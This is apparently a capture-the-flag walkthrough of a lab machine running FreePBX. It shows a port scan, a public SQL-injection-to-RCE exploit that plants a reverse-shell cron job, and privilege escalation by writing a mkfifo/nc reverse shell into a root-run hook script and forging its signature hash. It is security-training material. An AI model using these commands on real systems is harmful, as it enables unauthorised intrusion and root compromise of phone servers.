#### port scanning

`└─$ nmap  -sSCV 10.129.131.180  --min-rate 999  `
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 11:11 +0800
Nmap scan report for 10.129.131.180
Host is up (0.082s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
```
both 80 and 443 redirect to the same application 'Freepbx' with a sql caused RCE vuln

https://github.com/b4sh2/CVE-2025-57819-poc

#### foot hold
`python3 exploit.py http://connected.htb -p 8821`
```
[*] Listener address: 10.10.14.16:8821 (iface tun0)
[*] Confirming SQLi on http://connected.htb ...
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Listening on 0.0.0.0:8821
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jkwtzyhy' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[asterisk@connected .ssh]$
```
get user flage, run linpeas
from linpeas:
```
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha

/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

incron is cron task not triggered by time but by event. we can see some file activitites under /var/spool/asterisk/incron will trigger /usr/bin/sysadmin_manager running by root


cat /usr/bin/sysadmin_manager
#!/usr/bin/php
we can view the code of this php script, then modify the file and trigger the incron job to get a reverse shell.

#### privi escalate
check the privi of the target folder, we can write this file logrotate
[asterisk@connected .ssh]$ ls -la /var/www/html/admin/modules/ucp/hooks/
`ls -la /var/www/html/admin/modules/ucp/hooks/`
```
total 12
drwxr-xr-x.  2 asterisk asterisk   44 Jun  9 06:33 .
drwxrwxr-x. 10 asterisk asterisk 4096 Jun  9 06:49 ..
-rwxr-xr-x.  1 asterisk asterisk   93 Jun  9 06:49 logrotate
-rwxr-xr-x   1 asterisk asterisk  473 Jun  9 06:33 logrotate.bak
```
set payload in it
`[asterisk@connected .ssh]$ cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'`
```
 << 'EOF'r/www/html/admin/modules/ucp/hooks/logrotate 
> #!/bin/bash
#!/bin/bash
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.16 8823 >/tmp/f
/f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.16 8823 >/tmp 
> EOF
EOF
```
update hash value to bypass the hash check
`[asterisk@connected .ssh]$ NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')`
```
hooks/logrotate | awk '{print $1}')admin/modules/ucp/ 
[asterisk@connected .ssh]$ echo $NEW_HASH
echo $NEW_HASH
f95de10c52792658f1a7a026b4979b5eba4f897076b1bc50662369cf73b69709
```
`[asterisk@connected .ssh]$ sed -i "s/hooks\/logrotate = .*/hooks\/logrotate = $NEW_HASH/" \
    /var/www/html/admin/modules/ucp/module.sig`
```
[asterisk@connected .ssh]$ touch /var/spool/asterisk/incron/ucp.logrotate
touch /var/spool/asterisk/incron/ucp.logrotate
```
set a ncv listener
`└─$ nc -nvlp 8823`
```
listening on [any] 8823 ...
connect to [10.10.14.16] from (UNKNOWN) [10.129.131.180] 58994
bash: no job control in this shell


[root@connected /]# pwd
pwd
/
```


